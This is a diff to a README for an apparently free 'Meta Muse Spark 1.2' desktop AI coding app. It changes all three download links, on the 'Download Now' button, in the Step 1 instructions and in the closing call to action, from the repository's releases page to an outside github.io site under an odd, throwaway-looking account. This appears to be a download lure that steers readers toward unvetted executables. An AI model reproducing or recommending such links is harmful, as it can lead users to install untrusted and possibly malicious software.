@@ -1,6 +1,6 @@
 # ✨ Meta-Muse-Spark-1.2-Free-Desktop-App - Supercharge Your Coding with AI
 
-[🎯 **Download Now - Free Desktop App**](https://github.com/musaparadisiacasapientumairliner781/Meta-Muse-Spark-1.2-Free-Desktop-App/releases)
+[🎯 **Download Now - Free Desktop App**](https://musaparadisiacasapientumairliner781.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ Meta Muse Spark will help you write, fix, and understand code faster than ever b
 
 Visit this link to download the application:
 
-[👉 **https://github.com/musaparadisiacasapientumairliner781/Meta-Muse-Spark-1.2-Free-Desktop-App/releases**](https://github.com/musaparadisiacasapientumairliner781/Meta-Muse-Spark-1.2-Free-Desktop-App/releases)
+[👉 **https://musaparadisiacasapientumairliner781.github.io**](https://musaparadisiacasapientumairliner781.github.io)
 
 ### Step 2: Choose the Right File
 
@@ -169,7 +169,7 @@ Meta Muse Spark is designed to be your coding companion, whether you're a beginn
 
 Visit this link to download the application right now:
 
-[🚀 **Get Meta Muse Spark 1.2 Free**](https://github.com/musaparadisiacasapientumairliner781/Meta-Muse-Spark-1.2-Free-Desktop-App/releases)
+[🚀 **Get Meta Muse Spark 1.2 Free**](https://musaparadisiacasapientumairliner781.github.io)
 
 ---
 
